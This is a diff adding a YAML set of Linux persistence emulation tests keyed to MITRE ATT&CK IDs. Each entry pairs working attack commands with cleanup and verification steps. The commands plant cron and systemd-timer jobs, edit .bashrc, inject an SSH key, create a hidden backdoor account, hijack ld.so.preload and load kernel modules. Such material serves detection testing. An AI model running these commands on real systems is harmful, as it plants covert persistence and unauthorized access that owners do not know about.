@@ -1,0 +1,112 @@
+- id: T1053.003
+  name: cron 任务植入
+  setup: []
+  attack:
+  - (crontab -l 2>/dev/null; echo "* * * * * /tmp/.persist.sh") | crontab -
+  cleanup:
+  - crontab -r || true
+  verify:
+  - crontab -l 2>/dev/null | grep persist || echo CLEAN
+- id: T1053.002
+  name: at 一次性任务
+  setup: []
+  attack:
+  - echo "/tmp/.persist.sh" | at now + 5 minutes
+  cleanup:
+  - atrm $(atq | cut -f1) 2>/dev/null || true
+  verify:
+  - atq | grep . || echo CLEAN
+- id: T1543.002
+  name: systemd 服务植入
+  setup: []
+  attack:
+  - printf "[Service]\nExecStart=/tmp/.persist.sh\n[Install]\nWantedBy=multi-user.target\n"
+    | sudo tee /etc/systemd/system/.persist.service
+  - sudo systemctl daemon-reload && sudo systemctl enable .persist.service
+  cleanup:
+  - sudo systemctl disable .persist.service; sudo rm -f /etc/systemd/system/.persist.service;
+    sudo systemctl daemon-reload
+  verify:
+  - test -f /etc/systemd/system/.persist.service && echo DIRTY || echo CLEAN
+- id: T1546.004
+  name: shell 配置植入（.bashrc）
+  setup: []
+  attack:
+  - printf '/tmp/.persist.sh\n' | tee -a ~/.bashrc
+  cleanup:
+  - sed -i '\|/tmp/.persist.sh|d' ~/.bashrc
+  verify:
+  - grep persist ~/.bashrc || echo CLEAN
+- id: T1098.004
+  name: SSH authorized_keys 植入
+  setup:
+  - ssh-keygen -t ed25519 -N "" -f /tmp/.atk_key -q
+  attack:
+  - cat /tmp/.atk_key.pub >> ~/.ssh/authorized_keys
+  cleanup:
+  - sed -i "\|$(cut -d" " -f3 /tmp/.atk_key.pub)|d" ~/.ssh/authorized_keys; rm -f
+    /tmp/.atk_key*
+  verify:
+  - grep -c . ~/.ssh/authorized_keys 2>/dev/null | grep -v ^0$ && echo DIRTY || echo
+    CLEAN
+- id: T1136.001
+  name: 本地账户创建
+  setup: []
+  attack:
+  - sudo useradd -m -s /bin/bash .backdoor
+  cleanup:
+  - sudo userdel -r .backdoor 2>/dev/null || true
+  verify:
+  - id .backdoor 2>/dev/null || echo CLEAN
+- id: T1037.004
+  name: rc.local 启动脚本
+  setup: []
+  attack:
+  - printf "#!/bin/sh\n/tmp/.persist.sh\n" | sudo tee /etc/rc.local && sudo chmod
+    +x /etc/rc.local
+  cleanup:
+  - sudo rm -f /etc/rc.local
+  verify:
+  - test -f /etc/rc.local && echo DIRTY || echo CLEAN
+- id: T1574.006
+  name: ld.so.preload 劫持
+  setup: []
+  attack:
+  - echo "/tmp/.evil.so" | sudo tee /etc/ld.so.preload
+  cleanup:
+  - sudo rm -f /etc/ld.so.preload
+  verify:
+  - test -f /etc/ld.so.preload && echo DIRTY || echo CLEAN
+- id: T1547.006
+  name: 内核模块加载
+  setup: []
+  attack:
+  - sudo modprobe dummy || sudo insmod /tmp/.evil.ko || true
+  cleanup:
+  - sudo modprobe -r dummy || true
+  verify:
+  - lsmod | grep dummy || echo CLEAN
+- id: T1053.003b
+  name: cron.d 系统级植入
+  setup: []
+  attack:
+  - echo "* * * * * root /tmp/.persist.sh" | sudo tee /etc/cron.d/.system-cache
+  cleanup:
+  - sudo rm -f /etc/cron.d/.system-cache
+  verify:
+  - test -f /etc/cron.d/.system-cache && echo DIRTY || echo CLEAN
+- id: T1053.006
+  name: systemd timer 定时器植入
+  setup: []
+  attack:
+  - printf '[Unit]\nDescription=cache sync\n[Service]\nExecStart=/tmp/.persist.sh\n'
+    | sudo tee /etc/systemd/system/.cache-sync.service
+  - printf '[Unit]\nDescription=cache timer\n[Timer]\nOnBootSec=5min\nOnUnitActiveSec=5min\n[Install]\nWantedBy=timers.target\n'
+    | sudo tee /etc/systemd/system/.cache-sync.timer
+  - sudo systemctl daemon-reload && sudo systemctl enable --now .cache-sync.timer
+  cleanup:
+  - sudo systemctl disable --now .cache-sync.timer || true
+  - sudo rm -f /etc/systemd/system/.cache-sync.service /etc/systemd/system/.cache-sync.timer
+  - sudo systemctl daemon-reload
+  verify:
+  - test -f /etc/systemd/system/.cache-sync.timer && echo DIRTY || echo CLEAN
